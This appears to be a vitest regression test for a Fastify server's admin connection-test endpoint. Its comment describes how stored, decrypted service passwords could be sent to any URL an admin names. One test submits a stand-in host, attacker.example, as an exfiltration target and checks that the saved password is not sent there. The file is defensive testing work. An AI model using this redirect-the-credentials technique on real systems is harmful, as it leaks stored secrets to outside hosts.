import { pino } from 'pino';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import type { FastifyInstance } from 'fastify';
import type { AppContext } from '../src/context.js';
import { signSession } from '../src/auth/session.js';
import { encrypt } from '../src/crypto.js';
import { buildServer } from '../src/server.js';

/**
 * docs/API.md: the FactoryLogix password "never leaves the server". POST /api/admin/connection/test takes
 * unsaved values to test, and `getCredentials` fills in the STORED (decrypted) password whenever the
 * override has none, even when the override points somewhere else. So an admin session can make the
 * server hand the saved FactoryLogix password to any URL it names.
 */
const SECRET = 'k7Qm2vXz9LrT4pWc8NfYb3HsJd6AaEu5GxV1oRiBt0Zy';
const KEY = '9f3c1b7a5d2e48c6b0a1f7e3d9c5b2a48e6f0d1c3b5a79e2f4d6c8a0b1e3f5a7';
const STORED_BASE = 'http://factorylogix.plant.lan:6065/odata';
const STORED_PASSWORD = 'FL-service-account-Passw0rd!';

const adminRow = {
  id: 1,
  username: 'root',
  role: 'admin',
  active: true,
  created_at: new Date('2026-01-01T00:00:00Z'),
  last_login_at: null,
};

let app: FastifyInstance | null = null;
let outbound: { url: string; authorization: string }[] = [];
const realFetch = globalThis.fetch;

beforeEach(() => {
  process.env.ENCRYPTION_KEY = KEY;
  outbound = [];
  vi.stubGlobal('fetch', async (url: string | URL, init?: { headers?: Record<string, string> }) => {
    outbound.push({ url: String(url), authorization: init?.headers?.Authorization ?? '' });
    return new Response('not odata', { status: 200 });
  });
});

afterEach(async () => {
  vi.stubGlobal('fetch', realFetch);
  await app?.close();
  app = null;
});

async function boot(): Promise<FastifyInstance> {
  const stored = { base_url: STORED_BASE, username: 'svc-fld', password_enc: encrypt(STORED_PASSWORD, KEY) };
  const query = async (text: string, params: unknown[] = []) => {
    const sql = text.replace(/\s+/g, ' ').trim();
    if (/FROM users WHERE id = \$1/i.test(sql)) return { rows: [adminRow], rowCount: 1 };
    if (/^SELECT key, value FROM settings WHERE key = \$1$/i.test(sql) && params[0] === 'fl_connection') {
      return { rows: [{ key: 'fl_connection', value: stored }], rowCount: 1 };
    }
    return { rows: [], rowCount: 0 };
  };
  const db = { query };
  app = await buildServer({
    env: { sessionSecret: SECRET },
    db,
    pool: db,
    log: pino({ level: 'silent' }),
    sse: { addClient: () => 0, removeClient: () => undefined, broadcast: () => undefined },
    version: 'test',
  } as unknown as AppContext);
  return app;
}

function sentPassword(authorization: string): string {
  return Buffer.from(authorization.replace(/^Basic /, ''), 'base64').toString('utf8').split(':').slice(1).join(':');
}

describe('POST /api/admin/connection/test', () => {
  it('uses the saved password when testing the saved address (what the Test button needs)', async () => {
    const server = await boot();
    const token = await signSession({ userId: 1, role: 'admin' }, SECRET);
    await server.inject({
      method: 'POST',
      url: '/api/admin/connection/test',
      headers: { 'content-type': 'application/json', cookie: `fld_session=${token}` },
      payload: JSON.stringify({ base_url: STORED_BASE, username: 'svc-fld' }),
    });
    expect(outbound.map((o) => sentPassword(o.authorization))).toContain(STORED_PASSWORD);
  });

  it('never sends the saved password to a different address that was typed into the form', async () => {
    const server = await boot();
    const token = await signSession({ userId: 1, role: 'admin' }, SECRET);
    await server.inject({
      method: 'POST',
      url: '/api/admin/connection/test',
      headers: { 'content-type': 'application/json', cookie: `fld_session=${token}` },
      payload: JSON.stringify({ base_url: 'http://attacker.example:8000/odata', username: 'svc-fld' }),
    });
    const toAttacker = outbound.filter((o) => o.url.startsWith('http://attacker.example'));
    expect(toAttacker.map((o) => sentPassword(o.authorization))).not.toContain(STORED_PASSWORD);
  });
});
